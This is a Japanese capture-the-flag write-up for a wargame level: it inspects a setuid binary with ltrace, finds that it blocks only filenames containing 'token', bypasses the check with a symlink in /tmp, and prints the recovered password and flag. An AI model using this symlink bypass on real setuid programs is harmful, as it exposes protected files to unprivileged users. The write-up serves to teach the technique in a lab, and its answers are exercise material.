# Level 08

## 目的
ユーザー `flag08` の権限で `getflag` コマンドを実行し、フラグを取得する。

## 手順と解説

### 1. 調査

`level08` ユーザーでログイン後、ホームディレクトリを確認します。

```bash
ls -l
```
出力:
```text
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```
`flag08` のSetUIDが設定されたバイナリ `level08` と、読み取り権限のないファイル `token` があります。

バイナリを実行してみます。
```bash
./level08 token
```
出力:
```text
You may not access 'token'
```

### 2. 脆弱性の特定

`ltrace` を使用して内部動作を確認します。
```bash
ltrace ./level08 token
```
出力:
```text
strstr("token", "token") = "token"
```
プログラムは `strstr` 関数を使って、引数に "token" という文字列が含まれているかをチェックしています。
このチェックはファイル名（文字列）に対してのみ行われており、実体（inodeなど）に対するチェックではありません。

### 3. エクスプロイト（攻撃）

シンボリックリンクを作成し、ファイル名に "token" を含めずに `token` ファイルへアクセスします。

```bash
ln -s /home/user/level08/token /tmp/pwn
./level08 /tmp/pwn
```

### 4. 結果

`token` ファイルの中身（パスワード）が表示されました。
```text
quif5eloekouj29ke0vouxean
```

このパスワードを使って `flag08` としてログインし、フラグを取得します。

```bash
su flag08
# Password: quif5eloekouj29ke0vouxean
getflag
```

## 結果

### flag08 のパスワード
`quif5eloekouj29ke0vouxean`

### トークン (Flag)
`25749xKZ8L7DkSCwJkT9dyv6f`
